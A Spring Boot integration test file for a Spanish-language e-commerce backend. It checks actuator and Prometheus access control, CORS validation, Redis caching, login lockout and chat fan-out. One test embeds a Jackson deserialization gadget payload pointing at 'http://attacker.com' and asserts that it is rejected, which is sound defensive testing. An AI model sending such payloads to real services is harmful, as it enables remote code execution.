package com.tienda.ecommerce;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.tienda.ecommerce.auth.AuthServiceImpl;
import com.tienda.ecommerce.auth.JwtService;
import com.tienda.ecommerce.auth.LoginAttemptService;
import com.tienda.ecommerce.auth.dto.LoginRequest;
import com.tienda.ecommerce.carrito.CarritoService;
import com.tienda.ecommerce.chat.ChatPubSubBridge;
import com.tienda.ecommerce.chat.dto.MensajeChatResponse;
import com.tienda.ecommerce.common.CredencialesInvalidasException;
import com.tienda.ecommerce.common.TooManyRequestsException;
import com.tienda.ecommerce.config.CacheConfig;
import com.tienda.ecommerce.config.CorsOriginValidator;
import com.tienda.ecommerce.configuracion.AccesoService;
import com.tienda.ecommerce.producto.dto.CategoriaResponse;
import com.tienda.ecommerce.producto.dto.ProductoResponse;
import com.tienda.ecommerce.usuario.Rol;
import com.tienda.ecommerce.usuario.Usuario;
import com.tienda.ecommerce.usuario.UsuarioRepository;
import io.micrometer.core.instrument.simple.SimpleMeterRegistry;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.cache.Cache;
import org.springframework.cache.CacheManager;
import org.springframework.cache.interceptor.CacheErrorHandler;
import org.springframework.data.redis.RedisConnectionFailureException;
import org.springframework.data.redis.connection.DefaultMessage;
import org.springframework.data.redis.connection.RedisConnectionFactory;
import org.springframework.data.redis.core.StringRedisTemplate;
import org.springframework.data.redis.core.script.RedisScript;
import org.springframework.messaging.simp.SimpMessagingTemplate;
import org.springframework.security.crypto.password.PasswordEncoder;
import org.springframework.security.test.context.support.WithMockUser;
import org.springframework.test.context.ActiveProfiles;
import org.springframework.test.web.servlet.MockMvc;
import org.yaml.snakeyaml.Yaml;

import java.io.File;
import java.io.FileInputStream;
import java.math.BigDecimal;
import java.nio.charset.StandardCharsets;
import java.time.LocalDateTime;
import java.util.List;
import java.util.Map;
import java.util.Optional;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicInteger;

import static org.junit.jupiter.api.Assertions.*;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.ArgumentMatchers.anyList;
import static org.mockito.ArgumentMatchers.anyString;
import static org.mockito.ArgumentMatchers.eq;
import static org.mockito.Mockito.*;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.*;

@SpringBootTest(properties = "app.monitoring.prometheus-scrape-token=test-scrape-secret-2026")
@AutoConfigureMockMvc
@ActiveProfiles("test")
class CloudAndMonitoringIntegrationTest {

    @Autowired
    private MockMvc mockMvc;

    @Autowired
    private CacheManager cacheManager;

    @Autowired
    private UsuarioRepository usuarioRepository;

    @Autowired
    private PasswordEncoder passwordEncoder;

    @Autowired
    private org.springframework.context.ApplicationContext applicationContext;

    private final SimpleMeterRegistry testRegistry = new SimpleMeterRegistry();
    private final CacheConfig cacheConfig = new CacheConfig(testRegistry);

    @Test
    @DisplayName("Actuator: /actuator/health es público y responde UP")
    void actuatorHealth_esPublico_yRetornaUP() throws Exception {
        mockMvc.perform(get("/actuator/health"))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.status").value("UP"));
    }

    @Test
    @DisplayName("Actuator: /actuator/health/liveness es público para Kubernetes")
    void actuatorLiveness_esPublico() throws Exception {
        mockMvc.perform(get("/actuator/health/liveness"))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.status").value("UP"));
    }

    @Test
    @DisplayName("Actuator: /actuator/health/readiness es público para Kubernetes")
    void actuatorReadiness_esPublico() throws Exception {
        mockMvc.perform(get("/actuator/health/readiness"))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.status").value("UP"));
    }

    @Test
    @DisplayName("Prometheus: /actuator/prometheus está protegido sin autenticación (403 Forbidden)")
    void actuatorPrometheus_sinAuth_debeSerDenegado() throws Exception {
        mockMvc.perform(get("/actuator/prometheus"))
                .andExpect(status().isForbidden());
    }

    @Test
    @WithMockUser(authorities = "PRODUCTOS_VER")
    @DisplayName("Prometheus: /actuator/prometheus denegado para usuario autenticado sin permiso CONFIGURACION_GESTIONAR (403 Forbidden)")
    void actuatorPrometheus_conRolInadecuado_debeSerDenegado() throws Exception {
        mockMvc.perform(get("/actuator/prometheus"))
                .andExpect(status().isForbidden());
    }

    @Test
    @WithMockUser(authorities = "CLIENTE")
    @DisplayName("Prometheus: /actuator/prometheus denegado para CLIENTE (403 Forbidden)")
    void actuatorPrometheus_conRolCliente_debeSerDenegado() throws Exception {
        mockMvc.perform(get("/actuator/prometheus"))
                .andExpect(status().isForbidden());
    }

    @Test
    @WithMockUser(authorities = "CONFIGURACION_GESTIONAR")
    @DisplayName("Prometheus: /actuator/prometheus responde 200 y métricas en formato prometheus con permiso administrativo")
    void actuatorPrometheus_conPermisoAdmin_retornaMetricas() throws Exception {
        var result = mockMvc.perform(get("/actuator/prometheus"))
                .andReturn();
        assertEquals(200, result.getResponse().getStatus());
        String body = result.getResponse().getContentAsString();
        assertTrue(body.contains("jvm_memory_used_bytes")
                || body.contains("process_uptime_seconds")
                || body.contains("# TYPE"));
    }

    @Test
    @DisplayName("Prometheus: token dedicado PROMETHEUS_SCRAPE_TOKEN autoriza solo /actuator/prometheus con mínimo privilegio")
    void actuatorPrometheus_conTokenScraper_funcionaConMinimoPrivilegio() throws Exception {
        mockMvc.perform(get("/actuator/prometheus")
                        .header("Authorization", "Bearer token-incorrecto"))
                .andExpect(status().isForbidden());

        var okResult = mockMvc.perform(get("/actuator/prometheus")
                        .header("Authorization", "Bearer test-scrape-secret-2026"))
                .andExpect(status().isOk())
                .andReturn();
        assertTrue(okResult.getResponse().getContentAsString().contains("# TYPE"));

        mockMvc.perform(get("/actuator/metrics")
                        .header("Authorization", "Bearer test-scrape-secret-2026"))
                .andExpect(status().isForbidden());

        mockMvc.perform(get("/actuator")
                        .header("Authorization", "Bearer test-scrape-secret-2026"))
                .andExpect(status().isForbidden());
    }

    @Test
    @WithMockUser(authorities = "CONFIGURACION_GESTIONAR")
    @DisplayName("Actuator: Endpoint base /actuator responde 200 para administradores")
    void actuatorDiscovery() throws Exception {
        mockMvc.perform(get("/actuator"))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$._links").exists())
                .andExpect(jsonPath("$._links.prometheus").exists());
    }

    @Test
    @DisplayName("Actuator: endpoints no permitidos están bloqueados por defecto (denyAll)")
    void actuatorOtrosEndpoints_bloqueadosPorDefecto() throws Exception {
        mockMvc.perform(get("/actuator/beans"))
                .andExpect(status().isForbidden());
    }

    @Test
    @DisplayName("CORS: CorsOriginValidator rechaza comodines amplios y permite orígenes explícitos")
    void corsOriginValidator_rechazaComodinesAmplios() {
        assertThrows(IllegalStateException.class, () -> CorsOriginValidator.parseAndValidate(new String[]{"*"}));
        assertThrows(IllegalStateException.class, () -> CorsOriginValidator.parseAndValidate(new String[]{"https://*"}));
        assertThrows(IllegalStateException.class, () -> CorsOriginValidator.parseAndValidate(new String[]{"http://*"}));
        assertThrows(IllegalStateException.class, () -> CorsOriginValidator.parseAndValidate(new String[]{"https://*.com"}));

        List<String> valid = CorsOriginValidator.parseAndValidate(new String[]{"https://electronix.tudominio.com, http://localhost:8090"});
        assertEquals(List.of("https://electronix.tudominio.com", "http://localhost:8090"), valid);
    }

    @Test
    @DisplayName("CacheConfig: perfil test aisla caches en memoria sin requerir Redis activo")
    void testProfile_proveeCacheManagerAislado() {
        assertNotNull(cacheManager);
        assertNotNull(cacheManager.getCache(CacheConfig.CACHE_PRODUCTOS));
        assertNotNull(cacheManager.getCache(CacheConfig.CACHE_CATEGORIAS));
    }

    @Test
    @DisplayName("CacheConfig: serializador tipado real soporta DTOs/List.of, usa transactionAware y rechaza payloads polimórficos")
    void cacheConfig_serializacionSegura() throws Exception {
        RedisConnectionFactory mockFactory = mock(RedisConnectionFactory.class);
        var manager = cacheConfig.cacheManager(mockFactory);
        assertNotNull(manager);
        assertTrue(manager.isTransactionAware(), "RedisCacheManager debe diferir evictions hasta afterCommit");
        manager.afterPropertiesSet();

        // Ejercita TransactionAwareCacheDecorator y los serializadores reales configurados en RedisCacheManager
        var catDecorator = assertInstanceOf(
                org.springframework.cache.transaction.TransactionAwareCacheDecorator.class,
                manager.getCache(CacheConfig.CACHE_CATEGORIAS)
        );
        var prodDecorator = assertInstanceOf(
                org.springframework.cache.transaction.TransactionAwareCacheDecorator.class,
                manager.getCache(CacheConfig.CACHE_PRODUCTOS)
        );
        var catCache = (org.springframework.data.redis.cache.RedisCache) catDecorator.getTargetCache();
        var prodCache = (org.springframework.data.redis.cache.RedisCache) prodDecorator.getTargetCache();
        var catPair = catCache.getCacheConfiguration().getValueSerializationPair();
        var prodPair = prodCache.getCacheConfiguration().getValueSerializationPair();

        CategoriaResponse cat = new CategoriaResponse(1L, "Audio", "Equipos de sonido");
        var serializedCat = catPair.write(cat);
        CategoriaResponse deserializedCat = (CategoriaResponse) catPair.read(serializedCat);
        assertEquals(cat.getId(), deserializedCat.getId());
        assertEquals(cat.getNombre(), deserializedCat.getNombre());

        // Stream.toList() / List.of() (ImmutableCollections) debe serializarse y deserializarse sin fallos
        List<CategoriaResponse> lista = List.of(cat);
        var serializedLista = catPair.write(lista);
        @SuppressWarnings("unchecked")
        List<CategoriaResponse> deserializedLista = (List<CategoriaResponse>) catPair.read(serializedLista);
        assertEquals(1, deserializedLista.size());
        assertEquals("Audio", deserializedLista.get(0).getNombre());

        ProductoResponse prod = new ProductoResponse(
                1L, "Audífonos Bluetooth", "Descripción",
                new BigDecimal("99.90"), 10, "img.jpg",
                List.of("img.jpg", "img2.jpg"), 1L, "Audio", true, LocalDateTime.now()
        );
        var serializedProd = prodPair.write(prod);
        ProductoResponse deserializedProd = (ProductoResponse) prodPair.read(serializedProd);
        assertEquals(prod.getId(), deserializedProd.getId());
        assertEquals(prod.getImagenes().size(), deserializedProd.getImagenes().size());

        // Cualquier payload con @class / gadget / tipo ajeno es rechazado porque no usa DefaultTyping polimórfico
        byte[] rcePayload = "{\"@class\":\"org.springframework.context.support.FileSystemXmlApplicationContext\",\"configLocation\":\"http://attacker.com\"}"
                .getBytes(StandardCharsets.UTF_8);
        assertThrows(Exception.class, () -> catPair.read(java.nio.ByteBuffer.wrap(rcePayload)));
        assertThrows(Exception.class, () -> prodPair.read(java.nio.ByteBuffer.wrap(rcePayload)));

        byte[] typeConfusionPayload = "{\"@class\":\"java.util.HashMap\",\"id\":1}".getBytes(StandardCharsets.UTF_8);
        assertThrows(Exception.class, () -> catPair.read(java.nio.ByteBuffer.wrap(typeConfusionPayload)));
    }

    @Test
    @DisplayName("CacheConfig: Manejador de errores degrada GET, PUT, EVICT y CLEAR sin abortar negocio y registra métrica")
    void cacheConfig_errorHandler_gracefulDegradation() {
        CacheErrorHandler errorHandler = cacheConfig.errorHandler();
        assertNotNull(errorHandler);
        Cache mockCache = mock(Cache.class);
        when(mockCache.getName()).thenReturn("productos");

        assertDoesNotThrow(() -> errorHandler.handleCacheGetError(
                new RuntimeException("Redis connection refused"), mockCache, "key-123"));
        assertDoesNotThrow(() -> errorHandler.handleCacheEvictError(
                new RuntimeException("Redis timeout en eviction"), mockCache, "key-123"));
        assertDoesNotThrow(() -> errorHandler.handleCacheClearError(
                new RuntimeException("Redis timeout en clear"), mockCache));

        assertEquals(2.0, testRegistry.counter("electronix.cache.evict.errors").count());
    }

    @Test
    @DisplayName("LoginAttemptService: script Lua atómico en Redis, respaldo local acotado y serialización contra carrera concurrente")
    @SuppressWarnings("unchecked")
    void loginAttemptService_redisYDegradacionYConcurrencia() throws Exception {
        StringRedisTemplate redis = mock(StringRedisTemplate.class);
        SimpleMeterRegistry registry = new SimpleMeterRegistry();
        LoginAttemptService service = new LoginAttemptService(redis, registry, true);

        // Script Lua atómico devuelve 5 en el 5to intento -> incrementa métrica
        when(redis.execute(any(RedisScript.class), anyList(), eq("60"), eq("5"))).thenReturn(5L);
        service.registrarFallo("Ana@Test.com");
        verify(redis).execute(any(RedisScript.class),
                eq(List.of("electronix:auth:attempts:acct:ana@test.com", "electronix:auth:lock:acct:ana@test.com")),
                eq("60"), eq("5"));
        assertEquals(1.0, registry.counter("electronix.auth.bloqueos").count());

        // Verificación en una sola consulta TTL (sin hasKey+getExpire)
        when(redis.getExpire("electronix:auth:lock:acct:ana@test.com", TimeUnit.SECONDS)).thenReturn(42L);
        assertThrows(TooManyRequestsException.class, () -> service.verificarBloqueo("ana@test.com"));

        // Degradación a respaldo local ante caída de Redis (verifica que no lanza excepción)
        when(redis.getExpire(anyString(), eq(TimeUnit.SECONDS)))
                .thenThrow(new RedisConnectionFailureException("Redis down"));
        when(redis.execute(any(RedisScript.class), anyList(), anyString(), anyString()))
                .thenThrow(new RedisConnectionFailureException("Redis down"));

        for (int i = 0; i < 5; i++) {
            assertDoesNotThrow(() -> service.verificarBloqueo("local@test.com"));
            service.registrarFallo("local@test.com");
        }
        assertThrows(TooManyRequestsException.class, () -> service.verificarBloqueo("local@test.com"));

        // Carrera concurrente sobre una misma cuenta: máximo 5 verificaciones llegan al PasswordEncoder
        LoginAttemptService localRateLimiter = new LoginAttemptService();
        UsuarioRepository usuarioRepo = mock(UsuarioRepository.class);
        CarritoService carritoSvc = mock(CarritoService.class);
        PasswordEncoder encoder = mock(PasswordEncoder.class);
        JwtService jwtSvc = mock(JwtService.class);
        AccesoService accesoSvc = mock(AccesoService.class);
        when(accesoSvc.rolActivo(any())).thenReturn(true);
        Usuario usuario = new Usuario(1L, "Ana", "ana@tienda.com", "hash", Rol.CLIENTE, true);
        when(usuarioRepo.findByEmail("ana@tienda.com")).thenReturn(Optional.of(usuario));
        when(encoder.matches(anyString(), anyString())).thenAnswer(inv -> {
            Thread.sleep(10);
            return false;
        });

        AuthServiceImpl authService = new AuthServiceImpl(
                usuarioRepo, carritoSvc, encoder, jwtSvc, accesoSvc, localRateLimiter, null
        );

        int hilos = 15;
        CountDownLatch ready = new CountDownLatch(hilos);
        CountDownLatch start = new CountDownLatch(1);
        AtomicInteger credencialesInvalidas = new AtomicInteger();
        AtomicInteger bloqueados = new AtomicInteger();
        ExecutorService pool = Executors.newFixedThreadPool(hilos);
        try {
            for (int i = 0; i < hilos; i++) {
                pool.submit(() -> {
                    ready.countDown();
                    start.await();
                    try {
                        authService.login(new LoginRequest("ana@tienda.com", "malaclave"));
                    } catch (CredencialesInvalidasException ex) {
                        credencialesInvalidas.incrementAndGet();
                    } catch (TooManyRequestsException ex) {
                        bloqueados.incrementAndGet();
                    }
                    return null;
                });
            }
            assertTrue(ready.await(5, TimeUnit.SECONDS));
            start.countDown();
            pool.shutdown();
            assertTrue(pool.awaitTermination(10, TimeUnit.SECONDS));
        } finally {
            pool.shutdownNow();
        }
        assertEquals(5, credencialesInvalidas.get(), "Solo 5 intentos fallidos deben evaluarse antes de bloquear");
        assertEquals(10, bloqueados.get(), "Los 10 intentos concurrentes restantes deben bloquearse");
    }

    @Test
    @DisplayName("ChatPubSubBridge: propaga mensajes vía Redis Pub/Sub y degrada a entrega local si Redis falla")
    void chatPubSubBridge_fanoutYDegradacion() throws Exception {
        SimpMessagingTemplate simp = mock(SimpMessagingTemplate.class);
        ObjectMapper mapper = new ObjectMapper().registerModule(new com.fasterxml.jackson.datatype.jsr310.JavaTimeModule());
        StringRedisTemplate redis = mock(StringRedisTemplate.class);
        ChatPubSubBridge bridge = new ChatPubSubBridge(simp, mapper, redis);

        MensajeChatResponse msg = new MensajeChatResponse();
        msg.setId(99L);
        msg.setConversacionId(12L);
        msg.setContenido("Hola soporte");

        bridge.publicar("/topic/chat/12", msg);
        verify(redis).convertAndSend(eq(ChatPubSubBridge.CHANNEL), anyString());
        verify(simp, never()).convertAndSend(anyString(), any(Object.class));

        // Simular recepción desde Redis Pub/Sub en otra réplica
        String payload = mapper.writeValueAsString(new ChatPubSubBridge.ChatBroadcastEvent("/topic/chat/12", msg));
        bridge.onMessage(
                new DefaultMessage(ChatPubSubBridge.CHANNEL.getBytes(StandardCharsets.UTF_8), payload.getBytes(StandardCharsets.UTF_8)),
                null
        );
        verify(simp, times(1)).convertAndSend(eq("/topic/chat/12"), any(MensajeChatResponse.class));

        // Simular fallo de Redis -> degrada a instancia local
        doThrow(new RedisConnectionFailureException("Redis down"))
                .when(redis).convertAndSend(eq(ChatPubSubBridge.CHANNEL), anyString());
        bridge.publicar("/topic/chat/12", msg);
        verify(simp, times(2)).convertAndSend(eq("/topic/chat/12"), any(MensajeChatResponse.class));
    }

    @Test
    @DisplayName("Kubernetes: Validación de sintaxis e integridad de manifiestos YAML en k8s/")
    void k8s_manifiestos_sintaxisEIntegridad() throws Exception {
        File k8sDir = new File("k8s");
        assertTrue(k8sDir.exists() && k8sDir.isDirectory(), "La carpeta k8s/ debe existir");

        File[] files = k8sDir.listFiles((dir, name) -> name.endsWith(".yaml") || name.endsWith(".yml"));
        assertNotNull(files);
        assertTrue(files.length >= 8, "Deben existir al menos 8 manifiestos en k8s/");

        Yaml yaml = new Yaml();
        int totalDocumentos = 0;

        for (File file : files) {
            try (FileInputStream fis = new FileInputStream(file)) {
                Iterable<Object> docs = yaml.loadAll(fis);
                for (Object doc : docs) {
                    if (doc instanceof Map<?, ?> map) {
                        totalDocumentos++;
                        assertTrue(map.containsKey("apiVersion"), "El archivo " + file.getName() + " debe tener apiVersion");
                        assertTrue(map.containsKey("kind"), "El archivo " + file.getName() + " debe tener kind");
                    }
                }
            }
        }
        assertTrue(totalDocumentos >= 16, "Deben procesarse al menos 16 documentos YAML en k8s/");
    }

    @Test
    @DisplayName("Monitoreo: configuración de Prometheus y dashboard JSON de Grafana son válidos")
    void monitoring_configPrometheusYGrafanaValidos() throws Exception {
        File promFile = new File("monitoring/prometheus/prometheus.yml");
        assertTrue(promFile.exists(), "Debe existir monitoring/prometheus/prometheus.yml");
        Yaml yaml = new Yaml();
        try (FileInputStream fis = new FileInputStream(promFile)) {
            Map<?, ?> promCfg = yaml.load(fis);
            assertNotNull(promCfg.get("scrape_configs"));
        }

        File grafanaDash = new File("monitoring/grafana/dashboards/electronix-cloud-overview.json");
        assertTrue(grafanaDash.exists(), "Debe existir dashboard JSON de Grafana");
        JsonNode root = new ObjectMapper().readTree(grafanaDash);
        assertTrue(root.has("panels") && root.get("panels").size() >= 8);
    }

    @Test
    @DisplayName("CRIT-01: registro rechaza variante en minúsculas cuando existe usuario sembrado en mayúsculas/mixtas")
    void authRegistro_rechazaDuplicadoCaseInsensitive() throws Exception {
        String mixto = "CritMixAdmin@gmail.com";
        if (usuarioRepository.findByEmail(mixto).isEmpty()) {
            usuarioRepository.save(new Usuario(
                    null, "Admin", "Mixto", null,
                    com.tienda.ecommerce.usuario.TipoDocumento.DNI, "91234561",
                    mixto, passwordEncoder.encode("ClaveSegura#1"), Rol.ADMIN, true
            ));
        }
        long antes = usuarioRepository.count();

        String body = """
                {
                  "nombres": "Atacante",
                  "apellidoPaterno": "Prueba",
                  "tipoDocumento": "DNI",
                  "numeroDocumento": "91234562",
                  "email": "critmixadmin@gmail.com",
                  "password": "Password123!"
                }
                """;
        mockMvc.perform(org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post("/api/auth/registro")
                        .contentType(org.springframework.http.MediaType.APPLICATION_JSON)
                        .content(body))
                .andExpect(status().isBadRequest())
                .andExpect(jsonPath("$.exito").value(false));

        assertEquals(antes, usuarioRepository.count());
        assertTrue(usuarioRepository.findByEmail("critmixadmin@gmail.com").isPresent());
    }

    @Test
    @DisplayName("GlobalExceptionHandler: tipos inválidos retornan 400 y 404 no refleja la ruta solicitada")
    void globalExceptionHandler_entradaInvalidaY404Seguro() throws Exception {
        mockMvc.perform(get("/api/productos/no-numerico"))
                .andExpect(status().isBadRequest())
                .andExpect(jsonPath("$.exito").value(false));

        var notFoundResult = mockMvc.perform(get("/assets/ruta-inexistente-probe.js"))
                .andExpect(status().isNotFound())
                .andExpect(jsonPath("$.exito").value(false))
                .andExpect(jsonPath("$.mensaje").value("Recurso no encontrado"))
                .andReturn();
        assertFalse(notFoundResult.getResponse().getContentAsString().contains("ruta-inexistente-probe"));
    }

    @Test
    @DisplayName("HIGH-05: forward-headers-strategy=native no registra ForwardedHeaderFilter global confiado ciegamente")
    void seguridadProxy_sinForwardedHeaderFilterCiego() {
        assertTrue(applicationContext.getBeansOfType(org.springframework.web.filter.ForwardedHeaderFilter.class).isEmpty(),
                "ForwardedHeaderFilter de estrategia framework no debe estar activo");
    }
}
